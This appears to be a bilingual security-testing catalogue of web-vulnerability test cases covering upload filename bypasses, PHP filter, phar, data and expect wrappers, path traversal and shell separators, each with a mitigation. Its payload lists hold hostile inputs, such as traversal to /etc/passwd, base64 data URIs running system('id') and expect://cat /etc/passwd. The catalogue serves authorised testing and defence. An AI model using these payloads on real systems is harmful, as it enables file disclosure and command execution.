description.en: Upload a harmless text or image file and record original name, canonical name, disk location, and download handler.

title.zh: 逐文件名上传相同标记
title.en: Upload one filename variant at a time

description.zh: 保持内容为同一纯文本标记，只改变文件名并捕获各层规范化结果。
description.en: Keep the content as the same plain-text marker, change only the filename, and capture canonicalization at every layer.

attackChain.payload:
shell.php5
shell.phtml
shell.pht
shell.php.jpg
shell.php.png
shell.php%00.jpg
shell.php%00.png
shell.php;.jpg
shell.php;.png
shell.php%0a
shell.php%0d%0a
shell.php.jpg.php
shell.php.png.php
shell.pHp
shell.PHP
shell.pHP5
shell.php:.jpg
shell.php:.png
shell.php::$DATA
shell.php::$DATA%00

title.zh: 确认最终处理器行为

description.zh: 检查服务器映射、媒体类型和处理日志，区分静态下载、拒绝、重命名与服务器端解释。
description.en: 检查服务器映射、媒体类型和处理日志，区分静态下载、拒绝、重命名与服务器端解释。

title.zh: 迁移到不可执行对象存储

description.zh: 实施随机存储名和内容验证后重放全部文件名，确认合法上传保留且没有脚本处理。
description.en: After random storage names and content validation, replay every filename to preserve valid uploads without script handling.

overview.zh: 上传绕过由多个解析器共同决定：浏览器 multipart 名、应用校验、文件系统规范化、反向代理与 Web 服务器处理器映射。某个文件名被接受不等于代码执行，必须确认最终内容被置于可执行位置并由服务器端解释。
overview.en: 上传绕过由多个解析器共同决定：浏览器 multipart 名、应用校验、文件系统规范化、反向代理与 Web 服务器处理器映射。某个文件名被接受不等于代码执行，必须确认最终内容被置于可执行位置并由服务器端解释。

vulnerability.zh: 根因是仅检查最后扩展名或原始文件名，而下游对大小写、分号、控制字符、双扩展或 NTFS 数据流采用不同规则。若上传目录可执行，校验为图片的文件仍可能映射到 PHP 处理器。
vulnerability.en: The cause is validating only the last extension or raw filename while downstream layers treat case, semicolons, controls, double extensions, or NTFS alternate data streamss differently. If upload storage is executable, a file accepted as an image may still map to PHP.

exploitation.zh: 在隔离实例逐个文件名上传相同纯文本标记，记录每层文件名与真实磁盘路径，再通过 HEAD/GET 检查媒体类型和处理器日志。只有服务器端解释无害模板标记或路由到脚本处理器才成立；下载、重命名或静态文本返回是安全结果。
exploitation.en: 在隔离实例逐个文件名上传相同纯文本标记，记录每层文件名与真实磁盘路径，再通过 HEAD/GET 检查媒体类型和处理器日志。只有服务器端解释无害模板标记或路由到脚本处理器才成立；下载、重命名或静态文本返回是安全结果。

mitigation.zh: 使用服务端随机对象 ID 存储在 Web 根目录之外，上传目录明确不可执行。按允许列表同时验证规范扩展名、MIME 和内容签名，拒绝控制字符、保留名、ADS 和多重扩展；下载通过固定处理器设置安全 Content-Type 与附件头。
mitigation.en: Store server-generated random object IDs outside the web root and make upload storage nonexecutable. Allowlist canonical extension, MIME, and content signature together; reject controls, reserved names, ADS, and multiple extensions. Serve downloads through a fixed handler with safe Content-Type and attachment headers.

name.zh: LFI PHP Filter 转换边界

description.zh: 使用 ROT13、字符集转换、压缩加 Base64 和无显式转换的 filter URI，验证过滤链实际输出及资源读取边界。
description.en: Uses ROT13, character-set conversion, compression plus Base64, and a filter URI without an explicit transform to verify actual filter output and resource-read boundaries.

prerequisites.zh: 已确认目标文件 API 支持 PHP stream filter，并能记录实际加载的 filter 名称
prerequisites.en: The target file API is confirmed to support PHP stream filters and the filters actually loaded can be observed.

prerequisites.zh: 测试资源只包含已知 UTF-8 随机标记，可离线计算 ROT13、UTF-16 与压缩编码预期值
prerequisites.en: The test resource contains only a known UTF-8 random marker whose ROT13, UTF-16, and compressed encodings can be calculated offline.

title.zh: Filter 转换与对照 URI

description.zh: 将 index.php 替换为隔离标记资源，按原顺序逐条执行并与离线预期字节比较；不得读取生产源码。
description.en: Replace index.php with the isolated marker resource, execute each line in source order, and compare bytes with offline expectations; never read production source.

analysis.zh: 阳性必须把特定 filter 输出与同一标记资源的文件读取关联起来。乱码、Base64 外观、warning、空响应或最后一条无转换 URI 的处理差异都只是诊断信号，不能单独证明 LFI。
analysis.en: A positive must correlate a specific filter output with a read of the same marker resource. Garbled data, a Base64 appearance, warnings, empty responses, or differential handling of the no-transform control are diagnostic signals and cannot alone prove LFI.

opsecTips.zh: 所有 resource 指向单个无敏感标记文件并限制响应大小；任何非标记文件访问立即停止
opsecTips.en: Point every resource to one nonsensitive marker file and cap response size; stop immediately on any access to a nonmarker file.

opsecTips.zh: 完成后删除离线转换产物、标记文件和响应副本，并清除 PHP/代理缓存
opsecTips.en: After completion delete offline transform artifacts, the marker file, and response copies, and clear PHP and proxy caches.

title.zh: 生成转换后的标记基准

description.zh: 离线计算四种输入对应的原始或转换字节及摘要，并记录 PHP 版本。
description.en: Calculate the raw or transformed bytes and digest for all four inputs offline and record the PHP version.

title.zh: 逐条读取隔离资源
title.en: Read the isolated resource one line at a time

description.zh: 只替换 resource 路径，保持原 filter 顺序，每个请求使用不同标识。
description.en: Replace only the resource path, preserve original filter order, and use a distinct identifier for each request.

attackChain.payload:
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://filter/resource=index.php

title.zh: 匹配字节、摘要与文件事件
title.en: Match bytes, digests, and file events

description.zh: 将响应与离线期望、已加载 filter 和文件审计关联，排除代理二次编码。
description.en: Correlate the response with offline expectations, loaded filters, and file audit while excluding proxy re-encoding.

title.zh: 固定转换选项并清理
title.en: Pin transformation options and clean up

description.zh: 切换到服务端映射后重放合法选项和任意 filter URI，确认边界后删除标记资源。
description.en: 切换到服务端映射后重放合法选项和任意 filter URI，确认边界后删除标记资源。

overview.zh: PHP filter 链可以改变流的编码、字符集或压缩形态。四条输入属于同一读取边界，但预期输出不同；不带显式转换的最后一条可作为解析对照，不能自动视为绕过。
overview.en: A PHP filter chain can change stream encoding, character set, or compression. The four inputs exercise one read boundary with different expected outputs; the final URI without an explicit transform is a parser control and is not automatically a bypass.

vulnerability.zh: 当用户能控制 resource 和 filter 链且文件根目录未受约束时，应用可能以变换后的形式泄露本地内容或绕过简单响应检查。仅收到乱码、空响应或 PHP warning 不证明目标文件被读取。
vulnerability.en: When users control both resource and filter chain without a constrained file root, an application may disclose transformed local content or evade simplistic response inspection. Garbled bytes, an empty response, or a PHP warning does not prove that the target file was read.

exploitation.zh: 为随机标记离线生成每种转换的精确摘要，先读取合法资源基线，再逐条替换 URI。阳性要求响应字节或摘要匹配对应转换且文件审计指向同一标记资源；只识别 wrapper、filter 初始化失败或网关编码均排除。
exploitation.en: Generate an exact offline digest for each transformation of the random marker, establish a valid resource baseline, then substitute each URI separately. A positive requires response bytes or digest to match the corresponding transform and file audit to identify the same marker resource; wrapper recognition, filter-initialization failure, and gateway encoding are excluded.

mitigation.zh: 外部输入只选择预定义文件对象和转换选项，服务端组装固定 filter 链并校验规范路径位于根目录内；不允许任意 wrapper、filter 名称或 resource。修复后比较所有转换基线。
mitigation.en: 外部输入只选择预定义文件对象和转换选项，服务端组装固定 filter 链并校验规范路径位于根目录内；不允许任意 wrapper、filter 名称或 resource。修复后比较所有转换基线。

name.zh: LFI PHAR 归档成员读取边界

description.zh: 使用伪装为 JPG 和 PNG 的两个 phar:// 成员路径验证 PHP 是否按归档解析上传对象并读取指定成员。
description.en: Uses two phar:// member paths disguised as JPG and PNG uploads to test whether PHP parses an uploaded object as an archive and reads the named member.

prerequisites.zh: 隔离上传目录允许创建自有 PHAR 测试归档，归档成员仅含随机纯文本标记
prerequisites.en: The isolated upload directory permits a controlled PHAR test archive whose member contains only a random plaintext marker.

prerequisites.zh: 已记录 PHP 版本、phar.readonly、目标文件 API 和上传后的规范文件路径
prerequisites.en: The PHP version, phar.readonly setting, target file API, and canonical uploaded-file path are recorded.

title.zh: 图片扩展名 PHAR 成员路径

description.zh: 用自建归档文件名和纯文本 marker.txt 替换原目标，一次测试一个成员路径；不要包含 PHP 代码或反序列化元数据。
description.en: 用自建归档文件名和纯文本 marker.txt 替换原目标，一次测试一个成员路径；不要包含 PHP 代码或反序列化元数据。

analysis.zh: 确认结果仅限目标应用通过 phar wrapper 打开受控归档并返回 marker.txt。上传成功、扩展名伪装、外层文件读取、元数据解析错误或成员名含 shell.php 都不能证明代码执行或反序列化。
analysis.en: A confirmed result is limited to the target application opening the controlled archive through the phar wrapper and returning marker.txt. Upload success, extension disguise, outer-file reading, metadata errors, or a member named shell.php proves neither code execution nor deserialization.

opsecTips.zh: 归档禁止对象元数据、可执行 stub 和脚本成员；首次返回纯文本标记后立即停止
opsecTips.en: Forbid object metadata, executable stubs, and script members in the archive; stop immediately after the first plaintext marker return.

opsecTips.zh: 测试后删除上传对象、归档构建目录、对象存储副本和相关缓存索引
opsecTips.en: After testing delete the uploaded object, archive build directory, object-store copies, and related cache indexes.

title.zh: 构建无代码 PHAR 标记归档
title.en: Build a code-free PHAR marker archive

description.zh: 归档只含一个纯文本随机成员，不写对象元数据、启动 stub 或 PHP 代码。
description.en: The archive contains one random plaintext member and no object metadata, executable stub, or PHP code.

title.zh: 上传并逐个访问成员

description.zh: 使用随机外层文件名，替换成员为 marker.txt，并为每次请求记录唯一 ID。
description.en: Use a random outer filename, replace the member with marker.txt, and record a unique ID for each request.

attackChain.payload:
phar://uploads/avatar.jpg/shell.php
phar://uploads/file.png/test.txt

title.zh: 证明归档解析与成员返回
title.en: Prove archive parsing and member return

description.zh: 关联外层文件打开、PHAR 处理、成员读取和响应标记，不推导执行或反序列化。
description.en: Correlate outer-file open, PHAR handling, member read, and response marker without inferring execution or deserialization.

title.zh: 改为对象访问并删除归档
title.en: Move to object access and delete the archive

description.zh: 修复后验证普通图片仍可访问、phar scheme 被拒绝，然后删除归档和上传记录。
description.en: After remediation verify ordinary images remain accessible and the phar scheme is rejected, then delete the archive and upload record.

overview.zh: phar:// 让 PHP 把文件作为 PHAR 归档并访问内部成员，外层扩展名不决定实际解析器。这里验证的是归档成员读取，不应从文件名 shell.php 推断代码执行或从 PHAR 解析推断反序列化。
overview.en: phar:// makes PHP treat a file as a PHAR archive and access an internal member; the outer extension does not select the actual parser. This test covers archive-member reading and must not infer code execution from shell.php or deserialization from PHAR parsing.

vulnerability.zh: 若用户能控制上传内容和后续 phar URI，应用的普通文件访问边界可能变成归档成员访问。风险取决于目标 API、归档有效性和成员使用方式；文件上传成功或 wrapper 报错不是阳性。
vulnerability.en: If users control both uploaded content and a later phar URI, an ordinary file-access boundary may become archive-member access. Risk depends on the target API, archive validity, and how the member is consumed; a successful upload or wrapper error is not positive evidence.

exploitation.zh: 创建只含 marker.txt 的最小 PHAR，上传为两个允许的图片扩展名之一，并逐条访问对应成员。阳性要求应用进程打开该归档且返回唯一成员标记；仅检测到 MIME、读取外层文件或触发元数据警告均排除。
exploitation.en: Create a minimal PHAR containing only marker.txt, upload it under one permitted image extension, and access the member one line at a time. A positive requires the application process to open the archive and return the unique member marker; MIME detection, reading the outer file, or a metadata warning is excluded.

mitigation.zh: 上传对象使用随机服务端名称和不可执行存储，后续访问通过对象 ID，不接受 wrapper URI；在文件调用前校验 scheme、真实路径和允许媒体格式。清除旧上传并回归普通图片读取。
mitigation.en: 上传对象使用随机服务端名称和不可执行存储，后续访问通过对象 ID，不接受 wrapper URI；在文件调用前校验 scheme、真实路径和允许媒体格式。清除旧上传并回归普通图片读取。

name.zh: LFI 跨平台路径规范化差异

description.zh: 使用 Linux 与 Windows 遍历、重复分隔符、分号和空字节历史变体验证输入校验与最终文件系统规范化是否一致。
description.en: Uses Linux and Windows traversal, repeated separators, semicolons, and a historical null-byte form to test consistency between input validation and final filesystem canonicalization.

prerequisites.zh: Linux 和 Windows 测试根目录外各放置一个无敏感随机标记文件，且文件审计已启用
prerequisites.en: A nonsensitive random-marker file exists just outside the test root on both Linux and Windows, with file auditing enabled.

prerequisites.zh: 已识别代理、框架、语言运行时和文件系统的全部解码与规范化步骤
prerequisites.en: Every decoding and canonicalization step in the proxy, framework, language runtime, and filesystem is identified.

title.zh: Linux 与 Windows 遍历变体

description.zh: 按目标操作系统把末端文件替换为根目录外的随机标记；逐行提交并记录每层解码。%00 仅作为版本相关负对照，不预设可截断。
description.en: For the target operating system replace the terminal file with the random marker outside the root, submit one line at a time, and record every decode layer. Treat %00 only as a version-dependent negative control, not an assumed truncation.

analysis.zh: 有效路径遍历要求最终规范路径离开批准根目录且目标进程读取根外随机标记。输入含 `../`、组件返回不同错误、日志显示解码或历史 %00 语法被接受都不是充分证据。
analysis.en: Valid traversal requires the final canonical path to leave the approved root and the target process to read the outside random marker. An input containing ../, differential errors, logged decoding, or acceptance of historical %00 syntax is not sufficient evidence.

opsecTips.zh: 只读取专用根外标记，不使用 /etc、Windows 系统文件或应用配置；首次越界读取即停止
opsecTips.en: Read only the dedicated outside marker, never /etc, Windows system files, or application configuration, and stop on the first escaped read.

opsecTips.zh: 结束后删除两套标记与审计导出，清理应用缓存并确认原系统路径没有文件事件
opsecTips.en: Afterward delete both marker sets and audit exports, clear application caches, and confirm the original system paths have no file events.

title.zh: 布置根内外成对标记
title.en: Place paired in-root and out-of-root markers

description.zh: 两个文件使用不同随机值并启用路径和读取审计，以便区分正常与越界目标。
description.en: Use distinct random values in the two files and enable path and read auditing to distinguish valid and escaping targets.

title.zh: 按平台逐行替换目标
title.en: Replace targets line by line per platform

description.zh: Linux 只测正斜杠族，Windows 只测反斜杠族，并把 %00 保留为明确负对照。
description.en: Test forward-slash forms only on Linux and backslash forms only on Windows, retaining %00 as an explicit negative control.

attackChain.payload:
../../../etc/passwd
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..;/..;/..;/etc/passwd
%00../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\windows\win.ini
..\..\..\boot.ini

title.zh: 比较校验值与 Realpath

description.zh: 关联各层值、最终规范路径、文件事件和响应标记，定位发生差异的组件。
description.en: Correlate values at every layer, final canonical path, file event, and response marker to identify the divergent component.

title.zh: 实施根目录约束并回归

description.zh: 修复后证明根内对象仍可读、所有根外变体在文件调用前被拒绝，再移除标记。
description.en: After remediation prove the in-root object remains readable and every escaping form is rejected before the file call, then remove the markers.

overview.zh: 遍历测试的关键是最终规范路径是否逃离批准根目录，而不是输入中出现多少个点或斜杠。不同组件可能解码、折叠或保留分隔符；Windows 与 Linux 语义也不可互换。
overview.en: Traversal testing asks whether the final canonical path escapes the approved root, not how many dots or slashes appear in the input. Components may decode, collapse, or preserve separators differently, and Windows and Linux semantics are not interchangeable.

vulnerability.zh: 若入口按字符串过滤而下游再次解码或采用不同分隔符规则，校验值可能留在根目录内而文件系统目标已越界。现代 PHP 通常拒绝 URL 中的空字节，因此 %00 成功必须由实际版本证据证明。
vulnerability.en: If an entry point applies string filtering while a downstream layer decodes again or uses different separator rules, the validated value may appear in-root while the filesystem target escapes. Modern PHP generally rejects null bytes in paths, so any %00 success requires evidence from the actual version.

exploitation.zh: 先读取根目录内标记建立正常基线，再把每个变体末端替换为根外标记并记录原值、每层解码值、realpath 与文件审计。只有最终路径越界且响应匹配根外标记算阳性；400、路径回显和不存在错误均不是。
exploitation.en: Read an in-root marker for the valid baseline, then replace each variant's terminal target with the out-of-root marker and record raw input, every decoded value, realpath, and file audit. A positive requires a final escaped path and a response matching the outside marker; a 400, path reflection, or not-found error is not positive.

mitigation.zh: 使用对象 ID 选择文件，将候选路径在单次完整解码后与固定根目录组合，解析真实路径并验证其仍为根目录后代；拒绝绝对路径、空字节和平台不支持分隔符。
mitigation.en: Select files by object ID, fully decode once, join the candidate under a fixed root, resolve its real path, and verify it remains a descendant; reject absolute paths, null bytes, and separators unsupported by the target platform.

name.zh: LFI Data Wrapper 解释边界

description.zh: 使用明文和 Base64 的三个 data:// PHP 片段区分内联流读取、源码回显与 include 条件下的代码解释。
description.en: Uses three plaintext and Base64 data:// PHP fragments to distinguish inline-stream reading, source reflection, and code interpretation under include conditions.

prerequisites.zh: 已确认输入最终进入 include/require，并记录 allow_url_fopen 与 allow_url_include 的实际值
prerequisites.en: Input is confirmed to reach include or require, and the actual allow_url_fopen and allow_url_include values are recorded.

prerequisites.zh: 所有原始 PHP 片段先离线审查并替换为只输出随机标记的无副作用内容
prerequisites.en: Every original PHP fragment is reviewed offline and replaced with side-effect-free content that only prints a random marker.

title.zh: 明文与 Base64 Data URI

description.zh: 原始内容不得直接执行。把三条分别重写为同一随机标记输出，用于比较明文与 Base64 传输差异。
description.en: Do not execute the original content. Rewrite all three forms to emit the same random marker and use them only to compare plaintext with Base64 transport.

analysis.zh: 完整证据是目标 include/require 解释了改写后的随机标记片段并产生预期输出。Base64 解码、源码回显、phpinfo 字符串出现、统一 500 或 WAF 命中只能说明传输或过滤行为。
analysis.en: Complete evidence is that the target include or require interpreted the rewritten random-marker fragment and produced its expected output. Base64 decoding, source reflection, the string phpinfo, a generic 500, or a WAF match demonstrates only transport or filtering behavior.

opsecTips.zh: 离线解码并禁用原始 phpinfo/system 片段，只执行单次随机标记输出；出现子进程立即停止
opsecTips.en: Decode offline and disable the original phpinfo or system fragments, executing only a one-time random-marker output; stop immediately if a child process appears.

opsecTips.zh: 测试完成清理请求日志中的编码代码、opcode 缓存和临时模板，并轮换测试标记
opsecTips.en: At completion clean encoded code from request logs, clear opcode caches and temporary templates, and rotate the test marker.

title.zh: 确认 Include 数据流

description.zh: 从入口追踪到 include/require，记录 ini 配置、wrapper 状态和输出缓冲行为。
description.en: Trace the entry point to include or require and record ini settings, wrapper state, and output-buffer behavior.

title.zh: 重编码标记并逐条提交

description.zh: 用无副作用随机输出替换 phpinfo/system，保持明文与 Base64 形态并绑定请求 ID。
description.en: Replace phpinfo and system with side-effect-free random output, preserve plaintext and Base64 forms, and bind each to a request ID.

attackChain.payload:
data://text/plain,<?php phpinfo();?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

title.zh: 区分解释、读取与回显

description.zh: 比较 include 跟踪、标记输出、响应 MIME 和源码可见性，只把真实解释计为执行。
description.en: Compare include traces, marker output, response MIME, and source visibility, counting only real interpretation as execution.

title.zh: 关闭动态 Include 并清理
title.en: Disable dynamic inclusion and clean up

description.zh: 应用模板映射后重放，确认 data URI 不再进入解释器，并删除编码片段和缓存。
description.en: After applying template mappings replay the inputs, confirm data URIs no longer reach the interpreter, and delete encoded fragments and caches.

overview.zh: data wrapper 把 URI 内容作为流提供，Base64 参数只改变传输编码。真正的安全边界是流被普通读取还是被 include/require 当作 PHP 源解释；两种现象需要不同证据。
overview.en: The data wrapper exposes URI content as a stream, while the Base64 parameter changes only transport encoding. The security boundary is whether the stream is read as data or interpreted as PHP by include or require, and those outcomes require different evidence.

vulnerability.zh: 当外部输入控制 include 目标且 URL include 可用时，内联数据可能成为可解释源。若片段仅被输出、下载、写日志或因配置失败，则不能称为 RCE；phpinfo 文本本身也不证明函数运行。
vulnerability.en: When external input controls an include target and URL inclusion is enabled, inline data may become interpreted source. If the fragment is only printed, downloaded, logged, or rejected by configuration, it is not RCE; the text phpinfo does not prove that the function ran.

exploitation.zh: 将三条都转换成只输出不同随机标记的片段，按明文、Base64 无副作用、原危险形态替代物的顺序单次提交。阳性要求 include 跟踪与正确解码标记同时出现；源码文本、Base64 字符串或错误堆栈是假阳性。
exploitation.en: Convert all three lines into fragments that only emit distinct random markers and submit them once each as plaintext, harmless Base64, and the replacement for the original dangerous form. A positive requires both include tracing and the correctly decoded marker; source text, a Base64 string, or an error stack is false positive evidence.

mitigation.zh: 模板加载使用服务端映射，不接受 URI；关闭不需要的 URL include，限制 wrapper，并让内容展示与代码解释走独立路径。修复后回归合法模板、纯文本 data 流和全部三条负向输入。
mitigation.en: 模板加载使用服务端映射，不接受 URI；关闭不需要的 URL include，限制 wrapper，并让内容展示与代码解释走独立路径。修复后回归合法模板、纯文本 data 流和全部三条负向输入。

name.zh: LFI Expect Wrapper 执行前提

description.zh: 以单条 expect:// 输入验证 PECL expect 扩展是否注册、用户流 URI 是否可达以及 PHP 运行身份能否启动受控程序。
description.en: Uses one expect:// input to verify registration of the PECL expect extension, reachability of a user-controlled stream URI, and whether the PHP identity can start a controlled program.

prerequisites.zh: 仅在一次性隔离 PHP 实例安装 expect 扩展，并确认 stream_get_wrappers 返回 expect
prerequisites.en: The expect extension is installed only in a disposable isolated PHP instance and stream_get_wrappers confirms expect.

prerequisites.zh: 原始 cat 命令替换为固定 marker-helper，PHP 身份无网络、写入和读取敏感文件权限
prerequisites.en: The original cat command is replaced by a fixed marker-helper, and the PHP identity lacks network, write, and sensitive-file read privileges.

title.zh: Expect Wrapper 单行样例

description.zh: 该危险原行只作来源记录；实际执行必须替换为 expect://marker-helper，并由进程策略保证仅输出随机标记。
description.en: This dangerous original is retained only as a source record; actual execution must use expect://marker-helper, with process policy restricting it to random-marker output.

analysis.zh: 唯一可确认结果是目标 PHP 父进程启动受控 marker-helper 并返回对应随机输出。expect 字符串被接受、扩展已安装、wrapper 出现在列表或错误发生变化只证明前提，不证明命令执行。
analysis.en: The only confirmed result is the target PHP parent launching the controlled marker-helper and returning its random output. Acceptance of the expect string, an installed extension, a listed wrapper, or changed errors proves prerequisites, not command execution.

opsecTips.zh: 用应用控制和系统策略双重限制只可运行 marker-helper；出现其他 PID、文件访问或网络事件立即终止
opsecTips.en: Use both application and operating-system controls to permit only marker-helper; terminate immediately on any other PID, file access, or network event.

opsecTips.zh: 结束后销毁隔离实例、撤销帮助程序签名允许项并删除进程审计中的测试令牌
opsecTips.en: Afterward destroy the isolated instance, revoke the helper's signing allow-entry, and remove test tokens from process audit.

title.zh: 记录扩展、API 与进程策略
title.en: Record extension, API, and process policy

description.zh: 从目标 PHP 实例采集 wrapper 列表、最终调用和服务账户限制，确认可控实验范围。
description.en: Collect the wrapper list, final call, and service-account restrictions from the target PHP instance to define the controlled experiment.

title.zh: 替换为 Marker Helper 后提交
title.en: Submit after replacing with the marker helper

description.zh: 不运行原始 cat，只使用一次性随机令牌触发固定帮助程序并设置短超时。
description.en: Do not run the original cat command; trigger only the fixed helper with a one-time random token and short timeout.

attackChain.payload: expect://cat /etc/passwd

title.zh: 确认目标 PHP 启动唯一子进程
title.en: Confirm the target PHP launched the sole child

description.zh: 关联请求、父子 PID、可执行文件哈希和标准输出，排除其他任务或日志回显。
description.en: Correlate request, parent and child PIDs, executable hash, and stdout while excluding other jobs and log reflection.

title.zh: 卸载扩展并销毁实例
title.en: Remove the extension and destroy the instance

description.zh: 修复回归后删除帮助程序和审计材料，卸载临时扩展并销毁一次性 PHP 环境。
description.en: After remediation regression, delete the helper and audit artifacts, uninstall the temporary extension, and destroy the disposable PHP environment.

overview.zh: expect wrapper 是可选 PECL 功能，不属于标准 PHP 安装。单行 URI 只有在扩展已注册、目标 API 打开该流且进程权限允许时才可能跨入命令执行，因此必须逐项证明。
overview.en: The expect wrapper is an optional PECL feature and is not part of a standard PHP installation. The URI can cross into command execution only if the extension is registered, the target API opens the stream, and process permissions allow it, so every prerequisite must be proven.

vulnerability.zh: 文件包含或读取功能若接收任意 wrapper URI，且生产运行时错误启用 expect，攻击者可能让 PHP 创建子进程。unknown wrapper、命令文本回显、PECL 包存在或输入到达控制器都不是执行证据。
vulnerability.en: If a file include or read feature accepts arbitrary wrapper URIs while expect is mistakenly enabled in production, PHP may create a child process. An unknown-wrapper error, reflected command text, an installed PECL package, or input reaching a controller is not execution evidence.

exploitation.zh: 先从运行时确认 expect 注册和最终流 API，再将 cat 目标替换为只能打印随机值的签名帮助程序，提交一次并捕获进程审计。阳性要求 PHP 请求、帮助程序子进程和标记输出共享同一令牌；错误差异不算。
exploitation.en: Confirm expect registration and the final stream API from the runtime, replace cat with a signed helper that can only print a random value, submit once, and capture process audit. A positive requires the PHP request, helper child process, and marker output to share one token; error differences do not count.

mitigation.zh: 卸载 expect 扩展，文件入口拒绝非 file scheme，PHP 服务账户禁止启动子进程并限制系统调用。回归应证明合法文件对象仍可用，而 expect URI 在解析或策略层被拒绝。
mitigation.en: Remove the expect extension, reject non-file schemes at file entry points, and prevent the PHP service account from spawning children through process and syscall policy. Regression should preserve valid file objects while rejecting expect URIs at parsing or policy.

name.zh: Shell 命令分隔符边界

description.zh: 使用管道、逻辑运算符、分号和编码换行探测输入是否被操作系统 Shell 当作控制符解析。
description.en: Uses pipes, logical operators, semicolons, and encoded newlines to test whether input is parsed as shell control syntax.

prerequisites.zh: 已确认输入最终进入 Unix/POSIX 类 Shell，而不是直接作为 argv 传给固定程序。
prerequisites.en: Confirm that input reaches a Unix or POSIX-like shell rather than being passed directly as argv to a fixed program.

prerequisites.zh: 具备可关联请求 ID 的子进程审计，并可使用只输出随机标记的无害命令。
prerequisites.en: Have child-process auditing correlated by request ID and a harmless command that emits only a random marker.

title.zh: 基础命令分隔
title.en: Validation step 1 for Shell Command-Separator Boundary

description.zh: 基础命令分隔包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Shell Command-Separator Boundary validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是分隔符后的第二条标记命令由目标进程派生，且同结构阴性请求不执行。输入被页面回显、网关把换行拆成两个请求、或日志出现分号都属于假阳性。
analysis.en: Positive evidence is a second marker command spawned by the target after the separator while a structurally identical negative case does not execute. Reflection, a gateway splitting newlines into requests, or separators merely appearing in logs are false positives.

opsecTips.zh: 首次观察到独立标记子进程后立即停止，不继续尝试文件读取、网络连接或持久化命令。
opsecTips.en: Stop immediately after observing the first independent marker process; do not proceed to file reads, network callbacks, or persistence.

opsecTips.zh: 结束后删除标记文件、清除测试队列并核对没有残留子进程或异常 Shell 会话。
opsecTips.en: After testing, delete marker files, clear queued cases, and verify that no child process or unexpected shell session remains.

title.zh: 确认Shell 分隔符探测适用边界
title.en: Confirm the Shell Separator Probing boundary

description.zh: 覆盖 Unix Shell 常见命令连接符及 CR/LF 编码，目标是确认解释器边界而非直接执行高影响命令。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: Covers common Unix shell connectors and CR/LF encodings to identify an interpreter boundary without high-impact commands. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控Shell 分隔符探测样例
title.en: Submit a controlled Shell Separator Probing case

description.zh: 先用普通字母建立基线，再逐个加入分隔符并在后方放置只产生固定标记的无害命令。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Start with an alphanumeric baseline, then add one separator at a time followed by a harmless command that emits a fixed marker. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

title.zh: 核对Shell 分隔符探测证据

description.zh: 必须在子进程审计或响应中看到第二命令的固定标记，并排除输入回显、网关换行拆分与应用日志拼接。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: The fixed marker from the second command must appear in child-process audit or output after excluding reflection, gateway line splitting, and log concatenation. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归Shell 分隔符探测
title.en: Remediate and regress Shell Separator Probing

description.zh: 使用参数数组直接调用目标程序，禁止 shell 解释；对参数执行类型和允许列表校验并拒绝控制字符。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: Invoke the intended program with an argument array and no shell, validate types and allowlists, and reject control characters. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

overview.zh: Shell 命令分隔符边界用于覆盖 Unix Shell 常见命令连接符及 CR/LF 编码，目标是确认解释器边界而非直接执行高影响命令。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Shell Command-Separator Boundary is intended for this boundary: Covers common Unix shell connectors and CR/LF encodings to identify an interpreter boundary without high-impact commands. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 应用将输入拼入 shell 字符串或以 shell=true 调用子进程，控制字符因此从数据升级为语法。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: The application concatenates input into a shell string or invokes a child process with shell parsing, turning control characters from data into syntax. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 先用普通字母建立基线，再逐个加入分隔符并在后方放置只产生固定标记的无害命令。 必须在子进程审计或响应中看到第二命令的固定标记，并排除输入回显、网关换行拆分与应用日志拼接。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Start with an alphanumeric baseline, then add one separator at a time followed by a harmless command that emits a fixed marker. The fixed marker from the second command must appear in child-process audit or output after excluding reflection, gateway line splitting, and log concatenation. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 使用参数数组直接调用目标程序，禁止 shell 解释；对参数执行类型和允许列表校验并拒绝控制字符。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: Invoke the intended program with an argument array and no shell, validate types and allowlists, and reject control characters. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

name.zh: Shell IFS 空白替代注入

description.zh: 利用 $IFS 及参数扩展替代空格，验证过滤器与 Shell 对参数边界的解释差异。
description.en: Uses $IFS and parameter expansion as whitespace substitutes to test parser differences between filters and the shell.

prerequisites.zh: 目标解释器支持参数展开与字段分割，并已记录实际 IFS 值及是否被应用重写。
prerequisites.en: The target interpreter supports parameter expansion and field splitting, and the effective IFS value and application overrides are recorded.

prerequisites.zh: 准备一个无敏感内容的测试文件或 echo 标记，用于区分一个字符串与两个 argv 参数。
prerequisites.en: Prepare a nonsensitive test file or echo marker that distinguishes one string from two argv arguments.

title.zh: $IFS 绕过
